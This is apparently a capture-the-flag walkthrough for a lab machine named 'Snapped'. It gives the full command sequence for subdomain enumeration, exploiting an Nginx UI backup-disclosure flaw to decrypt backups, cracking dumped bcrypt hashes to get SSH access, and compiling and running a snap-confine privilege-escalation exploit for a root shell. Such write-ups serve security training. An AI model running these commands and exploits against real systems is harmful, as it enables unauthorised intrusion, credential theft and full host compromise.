
# SNAPPED

---
## Enumeration


---
#### NMAP

```
sudo nmap -Pn -sCV 10.129.xx.xx -vvv --min-rate 8888 -oN tcp.nmap
```


<img width="564" height="272" alt="image" src="https://github.com/user-attachments/assets/06b8608b-66a7-4006-bea2-04d004f572fe" />



---
#### FEROXBUSTER

```
feroxbuster -u http://snapped.htb
```

//found nothing useful



---
#### FFUF

```
ffuf -u http://10.129.xx.xx -H 'Host: FUZZ.snapped.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac 
```

//looked for subdomains and found `admin`
//add it to `/etc/hosts`


<img width="686" height="211" alt="image" src="https://github.com/user-attachments/assets/7abcab42-fc94-4cb8-ba76-fc6a7eca68e1" />




---
#### NginX UI Login Portal


//attemped basic SQLi but nothing works


<img width="522" height="481" alt="image" src="https://github.com/user-attachments/assets/203e6345-df5f-476a-a1ec-4568915b6df8" />





---
#### BURP

//check HTTP history on burp on admin.snapped.htb/ and there's these /api/ endpoints

<img width="974" height="467" alt="image" src="https://github.com/user-attachments/assets/afae5890-9d6d-4440-962d-14baf45da01f" />







---
#### FEROXBUSTER


- run feroxbuster again against admin.snapped.htb
- found /mcp endpoint

  
<img width="664" height="270" alt="image" src="https://github.com/user-attachments/assets/c8e36723-2f3b-4239-9167-427acb3691e5" />


//on browser


<img width="578" height="180" alt="image" src="https://github.com/user-attachments/assets/6081ab41-5470-4fb1-bfcf-a56d4d1aa350" />


- also run again against /api from burp earlier
- and we can see 200 for `/install` and `/backup`


<img width="609" height="265" alt="image" src="https://github.com/user-attachments/assets/55d0d059-0fe1-4741-8a45-afb391eaa139" />




//`/backup` got us a zip file


<img width="599" height="184" alt="image" src="https://github.com/user-attachments/assets/95e609de-6142-4010-9e80-c120cc2c25d4" />


<img width="612" height="324" alt="image" src="https://github.com/user-attachments/assets/91392ccc-d45d-48e1-a76d-2afa558adab8" />



- for some reason the .txt file is a binary file

- attempted to unzip the two nginx.zip and nginx-ui.zip and apparently it didn't work

- ran `file` on all three files and they're all data

- at this point let's google `nginx ui exploit`



---
#### GOOGLE

- google `nginx ui exploit`
- found `https://github.com/advisories/GHSA-g9w5-qffc-6762`
- also found `https://cvereports.com/reports/CVE-2026-27944`





---
## EXPLOITATION



---
#### CVE-2026-27944


//will go ahead and replicate the steps to exploit this vuln


```
curl -v -o backup.bin http://admin.snapped.htb/api/backup
```


<img width="565" height="597" alt="image" src="https://github.com/user-attachments/assets/52533a26-9289-43cf-a5d2-462c13d6a54e" />


```
echo eetZ8XJsLOy9TtNAWk5vveQ5H1ac9N4UNvJVwEiWXC8= | base64 -d | xxd -p
```
- and we got `79eb59f1726c2cecbd4ed3405a4e6fbde4391f569cf4de1436f255c048965c2f`
- this should be the key

```
echo C1/X6cRhtUxneQ6SFlF2Qg== | base64 -d | xxd -p                    
```
- and we got `0b5fd7e9c461b54c67790e9216517642`
- this should be the IV


<img width="539" height="139" alt="image" src="https://github.com/user-attachments/assets/2ab0f624-b023-4aca-9b6e-c1b85e040b84" />


- now we could use the provided python script

```
from Crypto.Cipher import AES
import base64
 
# Values from X-Backup-Security header
key = base64.b64decode("uFT8...")
iv = base64.b64decode("v1D...")
 
with open('backup.bin', 'rb') as f:
    ciphertext = f.read()
 
cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = cipher.decrypt(ciphertext)
 
with open('backup.tar.gz', 'wb') as f:
    f.write(plaintext)
```

//OR use openssl




---
#### OPENSSL


```
openssl enc -aes-256-cbc -d -in hash_info.txt -out hash_info-decrypted.txt -K 79eb59f1726c2cecbd4ed3405a4e6fbde4391f569cf4de1436f255c048965c2f -iv 0b5fd7e9c461b54c67790e9216517642
```


<img width="566" height="76" alt="image" src="https://github.com/user-attachments/assets/bec30514-7db4-41ce-b031-72b3e0019302" />


//it seems to have worked


<img width="567" height="97" alt="image" src="https://github.com/user-attachments/assets/ea94ffb7-6eb2-4d61-bf8e-3b8c309f5b67" />


//we now do the same for the two nginx zip files


```
openssl enc -aes-256-cbc -d -in nginx-ui.zip -out nginx-ui-decrypted.zip -K 79eb59f1726c2cecbd4ed3405a4e6fbde4391f569cf4de1436f255c048965c2f -iv 0b5fd7e9c461b54c67790e9216517642
```

```
openssl enc -aes-256-cbc -d -in nginx.zip -out nginx-decrypted.zip -K 79eb59f1726c2cecbd4ed3405a4e6fbde4391f569cf4de1436f255c048965c2f -iv 0b5fd7e9c461b54c67790e9216517642
```


<img width="569" height="178" alt="image" src="https://github.com/user-attachments/assets/d642f7fd-076f-4840-93bb-56094961b3f4" />


```
file *dec*
```


//looks good now


<img width="565" height="179" alt="image" src="https://github.com/user-attachments/assets/53d454f0-2c3b-42d8-a1fb-e235c2d2dc14" />


- go ahead and unzip both zip files
- and in `nginx-ui` we found `database.db`
- it potentially is a sqlite file -- use `file` to find out


<img width="301" height="91" alt="image" src="https://github.com/user-attachments/assets/810ea7e2-df90-4dd2-bf09-70167769de2e" />



<img width="595" height="77" alt="image" src="https://github.com/user-attachments/assets/c92e2a5a-4fcd-4236-899e-28556c29c470" />







---
#### SQLITE3


```
sqlite3 database.db
```

```
.tables
```

```
select * from users;
```

- we can see there's users admin and jonathan
- admin : $2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm
- jonathan : $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq


<img width="564" height="248" alt="image" src="https://github.com/user-attachments/assets/b3ccbdee-e49c-41c3-8fcc-7f86cd4e4833" />





---
#### HASHCAT

```
hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt
```

- jonathan's cracked
- it's `linkinpark`


<img width="512" height="81" alt="image" src="https://github.com/user-attachments/assets/411a783f-5d8f-4460-9a50-4e092e8a09fe" />


```
netexec ssh 10.129.13.31 -u jonathan -p 'linkinpark' --continue-on-success
```
//validate the creds with netexec -- and yes it works -- we're in

```
ssh jonathan@10.129.13.31
```

<img width="700" height="279" alt="image" src="https://github.com/user-attachments/assets/d2308b13-5af8-451e-a7d4-eb542766502a" />


<img width="379" height="45" alt="image" src="https://github.com/user-attachments/assets/8718efce-d208-4e8f-8acb-9db2cb7f885b" />






---
## PRIVESC


---
#### POST-EXPLOITATION ENUMERATION

```
sudo -l
```

//can't run sudo

```
find / -perm -4000 -ls 2>/dev/null
```
//check SUID

```
cat /etc/os-release
```
```
uname -a
```

- given the name of this box -- there's a good chance our path to root may involve SNAP
- check kernel and os versions

<img width="909" height="247" alt="image" src="https://github.com/user-attachments/assets/65ce76f7-9904-4122-a415-549d64c8a345" />




---
#### SNAP


```
snap --version
```

//ver 2.63.1

<img width="265" height="115" alt="image" src="https://github.com/user-attachments/assets/51e0b0ac-6383-4016-8c9a-b6da0246d00f" />


//google `snap 2.63.1 github`

//found `https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE`




---
#### CVE-2026-3888 -- By theCyberGeek


// per `https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE`


<img width="867" height="217" alt="image" src="https://github.com/user-attachments/assets/508fb0c0-0e1c-4e0c-a77d-4db381286806" />


```
git clone https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE
```

//go ahead and grab the exploit


```
gcc -O2 -static -o exploit exploit_suid.c
gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c
```

- will use the SUID variant
- compile both files per poc instructions


<img width="568" height="237" alt="image" src="https://github.com/user-attachments/assets/cf98d8cc-4681-4abe-a4a4-e4a5528de5e4" />




```
scp exploit jonathan@10.129.13.178:/tmp
```

```
scp librootshell.so jonathan@10.129.13.178:/tmp
```

//get both files onto target `/tmp` via scp


<img width="564" height="148" alt="image" src="https://github.com/user-attachments/assets/b00886ad-9482-4196-9bb5-215be7368e4a" />



```
./exploit ./librootshell.so
```

- for the race condition and the cleanup to finish it could take a few minutes


```
/var/snap/firefox/common/bash -p
```

- if all goes well a bash binary with suid bit should already be created in `/var/snap/firefox/common`
- we run it with `-p` to get a root shell










